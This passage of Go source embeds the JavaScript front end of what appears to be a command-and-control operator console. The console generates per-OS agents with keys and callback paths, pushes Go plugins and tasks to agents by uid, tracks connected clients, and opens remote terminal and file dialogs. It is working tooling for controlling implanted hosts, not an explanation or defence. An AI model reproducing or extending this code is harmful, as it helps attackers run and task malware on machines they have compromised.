            }

            if (target.classList.contains('agent-link')) {
                const os = target.getAttribute('data-os');
                const port = target.getAttribute('data-port');
                const server = this.server_data.find(s => s.port === port);
                if (!server) return;

                const path = server.path.replace(/^\//, "");
                fetch(this.server + "/`+web_route+`?op=getPlugin&remark=" + server.remark + "&os=" + os)
                    .then(res => res.json())
                    .then(pluginData => {
                        const code = pluginData?.code?.join("\n") || "/*code*/";
                        this.redirectToAgentCode(
                            os, port, server.protocol, path,
                            server.conn_path, server.msg_path, server.switch_path, server.encry_path,
                            server.download_path, server.result_path, server.net_path, server.info_path,
                            server.upload_path, server.list_path, server.option_path,
                            server.user, server.uid, server.hostname, server.keyPart,
                            server.filekey, code,server.windows_pro
                        );
                    });
            }

            if (target.classList.contains('plugin')) {
                const port = target.getAttribute('data-port');
                const server = this.server_data.find(s => s.port === port);
                if (!server) return;

                let dialog = document.getElementById("serverDialog");
                if (!dialog) {
                    dialog = document.createElement("div");
                    dialog.id = "serverDialog";
                    dialog.className = "serverDialog";
                    dialog.style.left = "50%";
                    dialog.style.display = "block";
                    dialog.dataset.remark = server.remark;

                    dialog.innerHTML =
                        "<h3>plugin</h3>" +
                        "<form id='pluginForm' method='POST'>" +
                        "<select id='select_os'>" +
                            "<option value='win'>windows</option>" +
                            "<option value='linux'>linux</option>" +
                            "<option value='macos'>macos</option>" +
                            "<option value='android'>android</option>" +
                        "</select><br>" +
                        "<input name='codeWord' placeholder='codeWord'><br>" +
                        "<div id='parameterContainer'>" +
                            "<span>Parameter count: <span id='parameterCount'>1</span></span>" +
                            "<button type='button' id='addParameterBtn'>+</button>" +
                            "<button type='button' id='removeParameterBtn'>-</button>" +
                            "<input type='hidden' name='parameter' id='parameterHidden' value='1' />" +
                        "</div>" +
                        "<input name='code' placeholder='golang language.msg-1,msg-2,msg-3 for parameter'><br>" +
                        "<input id='parameterDec' name='parameterDec' placeholder='Meaning of parameter'><br>" +
                        "<button type='button' id='submitBtn' onclick=\"plugin('" + server.remark + "')\">plugin</button>" +
                        "<button type='button' onclick='closeStartServerDialog()'>close</button>" +
                        "</form>" +
                        "<div id='plugin_list' class='plugin_list'></div>";

                    document.getElementById("server_index").appendChild(dialog);
                    requestAnimationFrame(() => {
                        dialog.style.transform = "translateX(-50%) scaleY(1)";
                        dialog.style.opacity = "1";
                    });

                    // 绑定参数加减按钮事件（首次创建时）
                    const addBtn = dialog.querySelector('#addParameterBtn');
                    const removeBtn = dialog.querySelector('#removeParameterBtn');
                    const countDisplay = dialog.querySelector('#parameterCount');
                    const countHidden = dialog.querySelector('#parameterHidden');

                    if (addBtn && removeBtn && countDisplay && countHidden) {
                        addBtn.onclick = () => {
                            let count = parseInt(countHidden.value);
                            if (count < 20) {
                                count++;
                                countHidden.value = count;
                                countDisplay.textContent = count;
                            }
                        };
                        removeBtn.onclick = () => {
                            let count = parseInt(countHidden.value);
                            if (count > 1) {
                                count--;
                                countHidden.value = count;
                                countDisplay.textContent = count;
                            }
                        };
                    }

                    this.refreshPluginList(server.remark);
                } else {
                    dialog.style.display = "block";
                    dialog.style.transform = "translateX(-50%) scaleY(1)";
                    dialog.style.opacity = "1";
                    if (dialog.dataset.remark !== server.remark) {
                        dialog.dataset.remark = server.remark;
                        this.refreshPluginList(server.remark);
                    }
                }
            }
        });
    }

    refreshPluginList(remark) {
        var pluginList = document.getElementById("plugin_list");
        if (!pluginList) return;

        var os_list = ['win', 'linux', 'macos', 'android'];

        os_list.forEach(function(os) {
            // 每个平台一个独立容器
            var sectionId = "plugin_section_" + os;
            var section = document.getElementById(sectionId);
            if (!section) {
                section = document.createElement("div");
                section.id = sectionId;
                pluginList.appendChild(section);
            }
            section.innerHTML = "";  // 只清空当前平台的内容

            fetch(this.server + "/`+web_route+`?op=getPlugin&remark=" + remark + "&os=" + os)
                .then(function(response) { return response.json(); })
                .then(function(pluginData) {
                    if (pluginData && pluginData.code && Array.isArray(pluginData.code) && pluginData.code.length > 0) {
                        var codes = pluginData.code;

                        var osTitle = document.createElement("h3");
                        osTitle.textContent = os;
                        section.appendChild(osTitle);

                        codes.forEach(function(codeStr, idx) {
                            if (codeStr === "/*code*/") return;

                            var pluginItem = document.createElement("div");
                            pluginItem.className = "plugin-item";
                            pluginItem.style.display = "flex";
                            pluginItem.style.justifyContent = "space-between";
                            pluginItem.style.alignItems = "center";
                            pluginItem.style.gap = "8px";

                            var shortText = codeStr.length > 20 ? codeStr.slice(0, 20) + "…" : codeStr;
                            var expanded = false;
                            var span = document.createElement("span");
                            span.textContent = shortText;
                            span.style.cursor = "pointer";
                            span.style.whiteSpace = "pre-wrap";
                            span.onclick = function () {
                                expanded = !expanded;
                                span.textContent = expanded ? codeStr : shortText;
                            };

                            var btnGroup = document.createElement("div");
                            btnGroup.style.display = "flex";
                            btnGroup.style.gap = "4px";

                            var deleteBtn = document.createElement("button");
                            deleteBtn.textContent = "🗑";
                            deleteBtn.title = "delete plugin";
                            deleteBtn.onclick = function () {
                                fetch("/`+web_route+`?op=delPlugin&remark=" + remark + "&os=" + os)
                                    .then(function() {
                                        pluginItem.remove();
                                    }).catch(function(error) {
                                        console.error("del plugin error:", error);
                                    });
                            }.bind(this);

                            var copyBtn = document.createElement("button");
                            copyBtn.textContent = "📋";
                            copyBtn.title = "复制代码";
                            copyBtn.onclick = function () {
                                navigator.clipboard.writeText(codeStr).then(function () {
                                    copyBtn.textContent = "✅";
                                    setTimeout(function () {
                                        copyBtn.textContent = "📋";
                                    }, 1000);
                                }).catch(console.error);
                            };

                            btnGroup.appendChild(copyBtn);
                            btnGroup.appendChild(deleteBtn);
                            pluginItem.appendChild(span);
                            pluginItem.appendChild(btnGroup);
                            section.appendChild(pluginItem);
                        });
                    } else {
                        var emptyItem = document.createElement("div");
                        emptyItem.className = "plugin-item";
                        emptyItem.style.display = "flex";
                        emptyItem.style.justifyContent = "space-between";
                        emptyItem.style.alignItems = "center";
                        emptyItem.style.gap = "8px";
                        emptyItem.innerHTML = "<span><strong>" + os + ":</strong> No plugin available</span>";
                        section.appendChild(emptyItem);
                    }
                }.bind(this)).catch(function(err) {
                    console.error("获取插件失败:", err);
                });
        }.bind(this));
    }

    // 下载配置
    downloadConfig(port) {
        // 根据 port 找到对应的 server
        const server = this.server_data.find(server => server.port === port);
        if (!server) {
            alert("未找到服务器配置！");
            return;
        }
    
        // 转换为 JSON 字符串
        const configData = JSON.stringify(server, null, 4);
    
        // 创建 Blob 对象
        const blob = new Blob([configData], { type: "application/json" });
        const url = URL.createObjectURL(blob);
    
        // 创建下载链接
        const a = document.createElement("a");
        a.href = url;
        a.download = "server_config_" + port + ".json";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    
        // 释放 URL
        URL.revokeObjectURL(url);
    }
    
    
    redirectToAgentCode(os, port, protocol, path, connPath, msgPath, switch_key, encry_key, download, result, net, info, upload, list, option, user,uid, hostname, keyPart, filekey,code, windows_pro) {
        const master = window.location.hostname + ":" + port;
    
        let queryParams = "os=" + encodeURIComponent(os) +
            "&server=" + encodeURIComponent(master) +
            "&Path=" + encodeURIComponent(path) +
            "&ConnPath=" + encodeURIComponent(connPath) +
            "&MsgPath=" + encodeURIComponent(msgPath) +
            "&switch_key=" + encodeURIComponent(switch_key) +
            "&encry_key=" + encodeURIComponent(encry_key) +
            "&download=" + encodeURIComponent(download) +
            "&result=" + encodeURIComponent(result) +
            "&net=" + encodeURIComponent(net) +
            "&info=" + encodeURIComponent(info) +
            "&upload=" + encodeURIComponent(upload) +
            "&list=" + encodeURIComponent(list) +
            "&option=" + encodeURIComponent(option) +
            "&username=" + this.username+
            "&user=" + encodeURIComponent(user) +
            "&uid=" + encodeURIComponent(uid) +
            "&hostname=" + encodeURIComponent(hostname) +
            "&keyPart=" + encodeURIComponent(keyPart) +
            "&filekey=" + encodeURIComponent(filekey)+
            "&code=" + encodeURIComponent(code);
        if (windows_pro) {
            queryParams += "&group_pro=" + encodeURIComponent(windows_pro);
        }
    
        const url = this.server + "/`+web_route+`?op=agentcode&protocol=" + encodeURIComponent(protocol) + "&" + queryParams;
        window.location.href = url;
    }
    
    

    checkTime() {
        let check_url = this.server + "/`+web_route+`?op=checkclient";
        setInterval(() => {
            fetch(check_url)
                .then(response => {
                    if (response.ok && response.headers.get('Content-Type').includes('application/json')) {
                        return response.json();
                    } else {
                        throw new Error("Invalid JSON response");
                    }
                })
                .then(data => {
                    data.forEach(item => {
                        let clientid = document.getElementById(item.port);
                        if(clientid){
                            clientid.innerHTML = item.client;
                        }
                    });
                })
                .catch(error => {
                    console.error("Error fetching data:", error);
                });
        }, 5000);
    }
}

class lain_chat{
    constructor(){
        this.server = window.location.protocol + "//" + window.location.host;
        this.username = this.getCookie("cookie");
        this.chat_slice = [];
    }
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
    renderChatItem(data) {
        let chat_div = document.getElementById("chat_div");
        let div = document.createElement("div");
        div.className = "chat_message";
        div.setAttribute("data-chatid", data.chatid);

        if (data.username === this.username) {
            div.classList.add("me");
        }

        // ✅ 只有自己的消息才显示删除按钮
        if (data.username === this.username) {
            let delBtn = document.createElement("span");
            delBtn.innerText = "×";
            delBtn.style.cssText = "float:right; cursor:pointer; color:#888; margin-left:8px;";
            delBtn.title = "delete";
            delBtn.onclick = () => this.deleteChat(data.chatid, data.message);

            let header = document.createElement("div");
            header.style.display = "flex";
            header.style.justifyContent = "space-between";
            header.style.alignItems = "center";

            let usernameSpan = document.createElement("strong");
            usernameSpan.innerText = data.username;

            header.appendChild(usernameSpan);
            header.appendChild(delBtn);
            div.appendChild(header);
        } else {
            let usernameSpan = document.createElement("strong");
            usernameSpan.innerText = data.username;
            div.appendChild(usernameSpan);
        }

        if (data.type === "file") {
            let link = document.createElement("a");
            link.href = "javascript:void(0);";
            link.className = "file_link";
            link.innerText = "📎 " + data.message;
            link.style.color = "#007BFF";
            link.style.textDecoration = "none";
            link.onclick = () => this.downloadChatFile(data.message);

            let linkDiv = document.createElement("div");
            linkDiv.style.marginTop = "4px";
            linkDiv.appendChild(link);

            div.appendChild(linkDiv);
        } else {
            let msgDiv = document.createElement("div");
            msgDiv.style.marginTop = "4px";
            msgDiv.innerText = data.message;
            div.appendChild(msgDiv);
        }

        let timeSpan = document.createElement("span");
        timeSpan.className = "chat_time";
        timeSpan.innerText = data.time;
        div.appendChild(timeSpan);

        chat_div.appendChild(div);
        chat_div.scrollTop = chat_div.scrollHeight;
    }
    async getNewChat() {
        try {
            setInterval(async () => {
                let url = this.server + "/`+web_route+`?op=getNewChat";
                let res = await fetch(url);
                let data = await res.json();
                if (!data || !data.chatid) return;
                if (this.chat_slice.length > 0 &&
                    this.chat_slice[this.chat_slice.length - 1].chatid === data.chatid) {
                    return;
                }
                this.chat_slice.push(data);
                this.renderChatItem(data);
            }, 5000);
        } catch (err) {
            console.error("Error in getNewChat:", err);
        }
    }
    async getChatSlice() {
        try {
            let res = await fetch(this.server + "/`+web_route+`?op=getChatSlice");
            let chat_data = await res.json();
            this.chat_slice = chat_data;

            let chat_div = document.getElementById('chat_div');
            chat_div.innerHTML = '';

            chat_data.forEach(item => {
                this.renderChatItem(item);
            });

        } catch (error) {
            console.error('Error in getChatSlice:', error);
        }
    }
    async sendChat() {
        if (!this.chat_slice) this.chat_slice = [];
        let chat_input = document.getElementById("chat_input").value.trim();
        if (chat_input === "") return;
        let chatid = this.chat_slice.length > 0
            ? this.chat_slice[this.chat_slice.length - 1].chatid + 1
            : 1;
        let payload = {
            username: this.username,
            message: chat_input,
            chatid: chatid,
            Type: "text"
        };
        try {
            let res = await fetch(this.server + "/`+web_route+`?op=sendChat", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(payload)
            });
            let data = await res.json();
            this.chat_slice.push(data);
            this.renderChatItem(data);
            document.getElementById("chat_input").value = "";
        } catch (error) {
            console.error("Error in sendChat:", error);
        }
    }
    async deleteChat(chatid , message) {
        try {
            var url = this.server + "/`+web_route+`?op=deleteChat";
            var payload = {
                chatid: chatid,
                username: this.username,
                message: message,
            };
            var res = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });
            var data = await res.json();
            if (data.status === "deleted") {
                // 1. 从本地 this.chat_slice 删除
                this.chat_slice = this.chat_slice.filter(function(item){
                    return item.chatid !== chatid;
                });
                // 2. 从 DOM 中删除对应 div
                var chat_div = document.getElementById("chat_div");
                var msgNode = chat_div.querySelector('[data-chatid="' + chatid + '"]');
                if (msgNode) {
                    msgNode.remove();
                }
            } else {
                console.warn("Delete failed:", data);
            }
        } catch (error) {
            console.error("Error in deleteChat:", error);
        }
    }
    async sendChatFile() {
        var fileInput = document.getElementById("chat_file");
        if (!fileInput.files.length) return;
        var file = fileInput.files[0];
        var chatid = this.chat_slice.length > 0
            ? this.chat_slice[this.chat_slice.length - 1].chatid + 1
            : 1;
        var chat_div = document.getElementById("chat_div");
        var pendingDiv = document.createElement("div");
        pendingDiv.className = "chat_message me pending_file";
        pendingDiv.innerText = "📎 " + file.name + " (" + Math.round(file.size / 1024) + " KB) - sending...";
        chat_div.appendChild(pendingDiv);
        chat_div.scrollTop = chat_div.scrollHeight;
        var formData = new FormData();
        formData.append("username", this.username);
        formData.append("chatid", chatid);
        formData.append("chatFile", file);
        try {
            var res = await fetch(this.server + "/`+web_route+`?op=chatFile", {
                method: "POST",
                body: formData
            });
            var data = await res.json();
            chat_div.removeChild(pendingDiv);
            this.chat_slice.push(data);
            this.renderChatItem(data);
        } catch (e) {
            pendingDiv.innerText = "❌ " + file.name + " (发送失败)";
            pendingDiv.style.color = "red";
        }
        fileInput.value = "";
    }
    async downloadChatFile(filename){
        // 构造下载 URL
        let url = this.server + "/`+web_route+`?op=downloadChatFile"
                + "&filename=" + encodeURIComponent(filename);
        // 直接打开新窗口下载
        window.open(url, "_blank");
    }
}

function net_init(shell_list) {
    try {
        const selectElement = document.getElementById('net_shell');
        selectElement.innerHTML = '<option value="">Select</option>';
        shell_list.forEach(item => {
            const option = document.createElement('option');
            option.value = item.uid; // UID
            option.textContent = item.host;
            selectElement.appendChild(option);
        });
    } catch (error) {
        console.error("error:", error);
    }
}
function toggleInfo(uid,op) {
    console.log(uid,op)
    if(op == "info"){
        var infoContent = document.getElementById(uid+"-info-content");
    }else if(op == "choose"){
        var infoContent = document.getElementById(uid+"-choose-content");
    }
    infoContent.classList.toggle("show");
}

// 打开 iframe
function openIframe(url) {
    var iframePanel = document.getElementById('iframePanel');
    var iframe = document.getElementById('iframe');
    iframe.src = url;
    iframePanel.style.display = 'block';
}

// 关闭 iframe
function closeIframe() {
    var iframePanel = document.getElementById('iframePanel');
    iframePanel.style.display = 'none';
}
// 切换侧边栏
function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const button = document.querySelector('.toggle-button');
    const log = document.getElementById('log');
    const serverIndexDiv = document.querySelector(".server_index");
    const contentDiv = serverIndexDiv.querySelector(".content");
    sidebar.classList.toggle('shrink');
    if (sidebar.classList.contains('shrink')) {
        button.textContent = '>';
        log.style.left = '50px';
        log.style.width = 'calc(100% - 50px)';
        contentDiv.style.width = 'calc(100% - 50px)';
    } else {
        button.textContent = '<';
        log.style.left = '180px';
        log.style.width = 'calc(100% - 180px)';
        contentDiv.style.width = 'calc(100% - 180px)';
    }
}

// 窗口调整大小
document.addEventListener("DOMContentLoaded", function () {
    // **只调整 .server_index > .content 和 #log 的高度**
    const logDiv = document.getElementById("log");
    const logContent = document.getElementById("log-content");
    const logHandle = logDiv.querySelector(".resize-handle");
    const serverIndexDiv = document.querySelector(".server_index");
    const contentDiv = serverIndexDiv.querySelector(".content");
    let isResizingLog = false, startY, startContentHeight, startLogHeight, totalHeight;

    function startResize(e) {
        isResizingLog = true;
        startY = e.touches ? e.touches[0].clientY : e.clientY;
        startContentHeight = contentDiv.offsetHeight;
        startLogHeight = logDiv.offsetHeight;
        totalHeight = serverIndexDiv.offsetHeight;
        document.addEventListener("mousemove", resizeLog);
        document.addEventListener("mouseup", stopResize);
        document.addEventListener("touchmove", resizeLog);
        document.addEventListener("touchend", stopResize);
    }

    function resizeLog(e) {
        if (!isResizingLog) return;
        let currentY = e.touches ? e.touches[0].clientY : e.clientY;
        let deltaY = startY - currentY;
        let newContentHeight = Math.max(60, startContentHeight - deltaY);
        let minLogHeight = 20;
        let maxContentHeight = totalHeight - minLogHeight;
        if (newContentHeight > maxContentHeight) newContentHeight = maxContentHeight;
        contentDiv.style.height = newContentHeight + "px";
        logDiv.style.height = (totalHeight - newContentHeight) + "px";
    }

    function stopResize() {
        isResizingLog = false;
        document.removeEventListener("mousemove", resizeLog);
        document.removeEventListener("mouseup", stopResize);
        document.removeEventListener("touchmove", resizeLog);
        document.removeEventListener("touchend", stopResize);
    }

    // 初始化高度自适应
    function setInitialHeights() {
        const total = serverIndexDiv.offsetHeight;
        const contentH = Math.floor(total * 0.8);
        const logH = total - contentH;
        contentDiv.style.height = contentH + "px";
        logDiv.style.height = logH + "px";
    }
    setInitialHeights();
    window.addEventListener('resize', setInitialHeights);

    logHandle.addEventListener("mousedown", startResize);
    logHandle.addEventListener("touchstart", startResize);

    // **自动更新日志内容**
    setInterval(function () {
        var server = window.location.protocol + "//" + window.location.host;
        var url = server + "/`+web_route+`?op=logRead&pos=50";
        fetch(url)
            .then(function (response) { return response.json(); })
            .then(function (data) {
                var html = "";
                for (var i = 0; i < data.length; i++) {
                    var entry = data[i];
                    html += "[" + entry.time + "]   :   " + entry.message + "\n";
                }
                document.getElementById("log-content").innerText = html;
            })
            .catch(function (err) {
                console.error("read log error:", err);
            });
    }, 3000);

    // **iframe 拖动**
    const iframePanel = document.getElementById("iframePanel");
    const dragHandle = iframePanel.querySelector(".drag-handle");
    let isDragging = false, offsetX, offsetY;

    function startDrag(e) {
        isDragging = true;
        offsetX = (e.touches ? e.touches[0].clientX : e.clientX) - iframePanel.offsetLeft;
        offsetY = (e.touches ? e.touches[0].clientY : e.clientY) - iframePanel.offsetTop;
        document.addEventListener("mousemove", dragMove);
        document.addEventListener("mouseup", stopDrag);
        document.addEventListener("touchmove", dragMove);
        document.addEventListener("touchend", stopDrag);
    }

    function dragMove(e) {
        if (!isDragging) return;
        let newX = (e.touches ? e.touches[0].clientX : e.clientX) - offsetX;
        let newY = (e.touches ? e.touches[0].clientY : e.clientY) - offsetY;
        const pageWidth = window.innerWidth, pageHeight = window.innerHeight;
        const panelWidth = iframePanel.offsetWidth, panelHeight = iframePanel.offsetHeight;
        if (newX < 0) newX = 0;
        else if (newX + panelWidth > pageWidth) newX = pageWidth - panelWidth;
        if (newY < 0) newY = 0;
        else if (newY + panelHeight > pageHeight) newY = pageHeight - panelHeight;
        iframePanel.style.left = newX + "px";
        iframePanel.style.top = newY + "px";
    }

    function stopDrag() {
        isDragging = false;
        document.removeEventListener("mousemove", dragMove);
        document.removeEventListener("mouseup", stopDrag);
        document.removeEventListener("touchmove", dragMove);
        document.removeEventListener("touchend", stopDrag);
    }

    dragHandle.addEventListener("mousedown", startDrag);
    dragHandle.addEventListener("touchstart", startDrag);

    // **侧边栏导航**
    const links = document.querySelectorAll(".sidebar a, .tle-sidebar a");
    const sections = document.querySelectorAll(".content > div");

    function showSection(targetId) {
        sections.forEach(section => {
            section.classList.toggle("hidden", section.id !== targetId);
        });
    }

    links.forEach(link => {
        link.addEventListener("click", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
        link.addEventListener("touchstart", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
    });

    // **默认选中第一个**
    if (links.length > 0) {
        showSection(links[0].getAttribute("data-target"));
    }
});

document.addEventListener('DOMContentLoaded', function () {
    // 选择电脑端和手机端的侧边栏
    const links = document.querySelectorAll('.sidebar a, .tle-sidebar a');
    const sections = document.querySelectorAll('.content > div');
    // 为每个链接添加点击事件
    links.forEach(link => {
        link.addEventListener('click', function (e) {
            e.preventDefault();
            const targetId = this.getAttribute('data-target');
            sections.forEach(section => {
                if (section.id === targetId) {
                    section.classList.remove('hidden');
                } else {
                    section.classList.add('hidden');
                }
            });
        });
    });
    // 侧边栏显示/隐藏按钮事件
    document.getElementById("tel-toggleBtn").addEventListener("click", function() {
        const sidebar = document.getElementById("tle-sidebar");
        if (sidebar.style.display === "none" || sidebar.style.display === "") {
            sidebar.style.display = "block";
            this.textContent = "🔽";
        } else {
            sidebar.style.display = "none";
            this.textContent = "📋";
        }
    });
});
function showPluginDialog(uid, os, paramDescList, codeword) {
    // 解析参数
    let paramDescArray = paramDescList ? decodeURIComponent(paramDescList).split(',') : [];
    if (!uid || !os || !paramDescList || !codeword) {
        alert("缺少必要参数");
        return;
    }

    // 弹窗容器
    let dialog = document.getElementById("plugin-dialog");
    if (!dialog) {
        dialog = document.createElement("form");
        dialog.id = "plugin-dialog";
        dialog.style.position = "fixed";
        dialog.style.top = "10%";
        dialog.style.left = "50%";
        dialog.style.transform = "translateX(-50%)";
        dialog.style.background = "#f9f9f9";
        dialog.style.zIndex = 9999;
        dialog.style.maxWidth = "95vw";
        dialog.style.width = "95%";
        dialog.style.margin = "40px auto";
        dialog.style.border = "1px solid #ccc";
        dialog.style.borderRadius = "8px";
        dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
        dialog.style.padding = "16px";
        document.body.appendChild(dialog);
    } else {
        dialog.innerHTML = ""; // 清空旧内容
    }

    // 关闭按钮
    let closeBtn = document.createElement("button");
    closeBtn.type = "button";
    closeBtn.textContent = "close";
    closeBtn.style.float = "right";
    closeBtn.onclick = function() {
        dialog.remove();
    };
    dialog.appendChild(closeBtn);

    // 参数输入框
    paramDescArray.forEach(desc => {
        let input = document.createElement('input');
        input.type = 'text';
        input.placeholder = desc;
        input.style.display = "block";
        input.style.margin = "8px 0";
        input.style.width = "90%";
        input.style.padding = "8px";
        input.style.boxSizing = "border-box";
        dialog.appendChild(input);
    });

    // 提交按钮
    let submitButton = document.createElement('button');
    submitButton.textContent = 'send';
    submitButton.style.padding = "10px 20px";
    submitButton.style.marginTop = "12px";
    submitButton.style.cursor = "pointer";
    submitButton.type = "button";
    submitButton.onclick = function(event) {
        event.preventDefault();
        sendMsg();
    };
    dialog.appendChild(submitButton);

    // 发送消息函数
    function sendMsg() {
        let inputs = dialog.querySelectorAll('input[type="text"]');
        let msgParts = [];
        for (let input of inputs) {
            let value = input.value.trim();
            if (!value) {
                alert("Please fill in all fields.");
                return;
            }
            msgParts.push(value);
        }
        let msg = codeword + '^' + msgParts.join('^');
        fetch('/`+web_route+`?op=msg&uid=' + encodeURIComponent(uid) + '&msg=' + encodeURIComponent(msg) + '&Taskid=pluginTask', {
            method: 'GET'
        })
        .then(response => {
            if (response.ok) {
                alert("Message sent successfully!");
                inputs.forEach(input => input.value = '');
            } else {
                return response.text().then(text => {
                    throw new Error(text);
                });
            }
        })
        .catch(error => {
            console.error("Failed to send message:", error);
            alert("Failed to send message: " + error.message);
        });
    }
}
window.lainIndex = new lain_index();
window.showTerminalDialog = function(uid, host, os) {
    // 这里要用你的类实例，比如
    if (window.lainIndex) {
        window.lainIndex.showTerminalDialog(uid, host, os);
    }
};
window.showFileDialog = function(uid, host) {
    if (window.lainIndex) {
        window.lainIndex.showFileDialog(uid, host);
    }
};
window.showMsgDialog = function(uid, host) {
    if (window.lainIndex) {
        window.lainIndex.showMsgDialog(uid, host);
    }
};
`

			w.Header().Set("Content-Type", "text/javascript")
			fmt.Fprint(w, html)
			return
		}
	}
}
